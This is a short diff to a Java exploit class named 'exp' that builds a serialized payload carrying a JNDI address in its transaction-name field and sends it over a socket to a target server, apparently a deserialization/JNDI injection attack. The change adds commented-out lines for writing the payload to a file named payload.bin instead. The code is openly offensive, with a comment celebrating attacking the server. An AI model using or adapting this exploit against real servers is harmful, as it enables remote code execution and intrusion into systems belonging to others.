@@ -7,6 +7,7 @@ import com.sun.net.httpserver.HttpServer;
 
 import javax.naming.Reference;
 import java.io.ByteArrayOutputStream;
+import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.ObjectOutputStream;
 import java.net.InetSocketAddress;
@@ -74,10 +75,12 @@ public class exp {
         payload.setUserTransactionName(JNDIAddress);
 
         // send to server and fuck it!
+        // or you can write payload to file and do something else..
+        // ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
+        // oos.writeObject(payload);
         System.out.println("send payload to target!");
         ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
         oos.writeObject(payload);
         oos.flush();
-
     }
 }
